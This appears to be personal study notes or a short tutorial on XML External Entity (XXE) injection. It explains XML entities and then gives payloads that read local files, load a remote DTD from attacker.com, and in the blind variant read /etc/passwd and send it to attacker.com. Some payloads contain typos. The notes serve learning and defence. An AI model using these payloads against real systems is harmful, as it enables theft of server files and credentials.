# XXE - XML EXTERNAL ENTITY
### WHAT IS XML
XML stands for extensible mark of language. It is used for data transportation. It supprots custom tags just like json key.
It is used for data storage also

#### How XML Document Looks

```xml
<?xml version="1.0"?>
<Person>
<Name>Rahim</Name>
<Age>20</Age>
</Person>
```
- First Line Is XML Metadata
- All XML data should have only 1 Root ELement Here We have Person

#### What is XML Entity 
- It is like XML variable. We can assign value in entity and use it multiple time in different parts.
- These entities are defined in a seprate part of the document called DTD / Document Type Declaration.

```xml
<?xml version="1.0" ?>
<!DOCTYPE Person [
	<!ENTITY name "Rahim">
]> 
<Person>
	<Name>&name;</Name>
	<Age>20</Age>
</Person>
```

### Types Of Entities
- General 
- Parameter
- Pre Defined Entities

### Example Of XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE XXE[
	<!ENTITY subscribe SYSTEM "secret.txt">
]>
<pwn>
&subscribe;
</pwn>
```
- Here System Keyword Is Used To Fetch External Resource And store it in Entity
- It supports protocols as : file:// , http:// , ftp://

### Types Of XXE
- InBand
- Error Based
_ Out Of Band

### Exploiting The Functions Of XML
- We can feed a entity inside another enitiy 
- We can reference a remote entity inside a DTD
- Defined : 
```xml
<?xml version="1.0"?>
<!DOCTYPE Pwn [
	<!ENTITY % parameter_entity "<!ENTITY general_entity 'Rahim'>">
	%parameter_entity;
]>
<pwn>&general_entity</pwn>
```
- After Parsing It Becomes :
```xml
<?xml version="1.0"?>
<!DOCTYPE Pwn [
	<!ENTITY % parameter_entity "<!ENTITY general_entity 'Rahim'>">
	<!ENTITY general_entity 'Rahim'>
]>
<pwn>&general_entity</pwn>
```
#### Instead of adding random Value we can referecne remote dtd
```xml
<?xml version="1.0"?>
<!DOCTYPE Pwn [
	<!ENTITY % parameter_entity "http://attacker.com/exploit.dtd">
	%parameter_entity;
]>
<pwn>&general_entity</pwn>
```
- Now exploit.dtd contents will be replaced in  the place of %parameter_entity;

## Exploiting Blind XXE
- payload
```xml
<?xml version="1.0" ?>
<!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd" >
<data>&send;</data>
```

- Evil.dtd File Contents
```xml
<!ENITY % passwd SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.com?%passwd;'">
%wrapper;
```
### CheckOut PwnFunction Video On XXE
### STOK's Videp On Reading Files through  SVG Upload , Pdf Gen, Upload etc
### DOS attack using XXE
### HTB fulcrum Lab / IPPSEC walkthrough
### For RCE using XXE checkout awessom xml works by nicolas greqoire
















